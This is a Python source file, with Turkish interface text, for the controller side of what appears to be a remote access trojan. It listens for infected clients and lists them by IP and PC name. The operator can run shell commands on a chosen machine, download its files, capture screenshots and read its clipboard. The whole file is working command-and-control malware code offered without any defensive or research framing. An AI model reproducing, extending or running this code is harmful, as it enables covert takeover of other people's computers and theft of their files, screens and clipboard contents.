import socket
import threading
from colorama import Fore, init
from PIL import Image

init()

host = ""
port = 1250

connection_list = []
address_list = []
pc_name_list = []

serverSocket = socket.socket()

def connectSocket():
    try:
        serverSocket.bind((host, port))
        serverSocket.listen(5)
    except:
        print(Fore.RED+ "Bağlantı hatası"+ Fore.RESET)
        connectSocket()

def accept():
    while 1: 
        try:
            connection, address = serverSocket.accept() # Client info
            connection_list.append(connection)
            address_list.append(address)
            connection.send("pcname".encode("utf-8"))
            response = connection.recv(1024).decode("utf-8")
            pc_name_list.append(response)
        except:
            print(Fore.RED+ "Bağlantı hatası"+ Fore.RESET)

def send_command(connection):
    while 1:
        try:
            command = input(Fore.LIGHTCYAN_EX+ "\nKomut: "+ Fore.WHITE)
            if command == "quit":
                connection.send("quit".encode("utf-8"))
                break
            if len(command) > 0:
                connection.send(command.encode("utf-8"))
                response = connection.recv(32768).decode("utf-8") # Read Data 32768 Byte and to string (utf-8)
                print(f"\n {Fore.YELLOW} {response} \n")
                
        except Exception as e:
            print(e)

def sort():
    print(Fore.LIGHTYELLOW_EX+ "\n------------------------------Clients------------------------------"+ Fore.RESET)
    print(Fore.LIGHTRED_EX+ "SIRA \t \t IP \t \t \t PORT \t \t "+ "BİLGİSAYAR"+ Fore.RESET)
    for index, connection in enumerate(connection_list):
        try:
            connection.send(b" ")
            connection.recv(1024)
        except:
            connection_list.pop(index)
            address_list.pop(index)
            continue
        print(Fore.LIGHTGREEN_EX+ "\n"+str(index) + " \t \t "+ address_list[index][0] + " \t \t "+ str(address_list[index][1])+ "\t \t "+ pc_name_list[index]+ Fore.RESET) # ip - port
            
def connect_client(index):
    try:
        connection = connection_list[index]
        print(Fore.GREEN+ address_list[index][0]+ " IP adresine bağlandı.\n"+ Fore.RESET)
        return connection
    except:
        print(Fore.RED+ "Geçersiz client bağlantısı"+ Fore.RESET)
        return False
        
def file_transfer(connection, path=""):
    operation = "ss"
    if path == "":
        path = input(Fore.LIGHTCYAN_EX+ "Konum: "+ Fore.RESET)
        operation = "dt"
    else:
        connection.send("dt".encode("utf-8"))
    connection.send(path.encode("utf-8"))
    save_size = 0
    size = int(connection.recv(8192).decode("utf-8"))
    connection.send(b" ")
    
    if operation == "dt":    
        file_name = input(Fore.LIGHTCYAN_EX+ "\nDosya adı: "+ Fore.RESET)
    else:
        file_name = "ss.png"
    print(Fore.GREEN + "Dosya işlemi gerçekleşiyor..."+ Fore.RESET)
    with open("<path>"+file_name, "wb") as file:
        try:
            while 1:
                data = connection.recv(1024)
                save_size += len(data)
                file.write(data)
                if save_size >= size:
                    break
        except Exception as e:
            print("Dosya Transfer Hata: "+ e)
        
    print(Fore.LIGHTGREEN_EX+ "Dosya transferi gerçekleşti."+ Fore.RESET)
        
def get_screenshot(connection):
    path = connection.recv(1024).decode("utf-8")
    file_transfer(connection, path)
    image = Image.open("<path>/ss.png")
    image.show()
    
    
def get_clipboard(connection):
    clipboard = connection.recv(8192).decode("utf-8")
    print(clipboard)
        
def main_shell():
    while 1:
        try: 
            print(Fore.LIGHTYELLOW_EX+ "\n-----KOMUT LİSTESİ-----"+ Fore.RESET)
            print(Fore.CYAN+ "-> listele \n-> baglan [sıra]"+ Fore.RESET)
            command = input(Fore.LIGHTCYAN_EX+ "Komut: "+ Fore.RESET) 
            if command == "listele":
                sort()
            elif "baglan" in command:
                number = int(command[6:])
                connection = connect_client(number)
                if connection:
                    while 1:
                        print(Fore.LIGHTYELLOW_EX+ "-----İSTEK LİSTESİ-----"+ Fore.RESET)
                        print(Fore.CYAN+ "-> cmd \n-> dt (dosya transferi) \n-> ss (Ekran görüntüsü) \n-> pano \n-> disconnect"+ Fore.RESET)
                        request = input(Fore.LIGHTCYAN_EX+ "İstek: "+ Fore.RESET)
                        
                        if request == "cmd":
                            connection.send("cmd".encode("utf-8"))
                            send_command(connection)
                        elif request == "dt":
                            connection.send("dt".encode("utf-8"))
                            file_transfer(connection, "")
                        elif request == 'ss':
                            connection.send("ss".encode("utf-8"))
                            get_screenshot(connection)
                        elif request == 'disconnect':
                            break
                        elif request == 'pano':
                            connection.send("clipboard".encode("utf-8"))
                            get_clipboard(connection)
                        else:
                            print(Fore.RED+ "Geçersiz istek"+ Fore.RESET)
            else:
                print(Fore.RED+ "Geçersiz komut"+ Fore.RESET)
        except Exception as e:
            print(f"Hata: {e}")
            

connectSocket()

shellThread =  threading.Thread(target= main_shell)
acceptThread = threading.Thread(target= accept)

shellThread.start()
acceptThread.start()
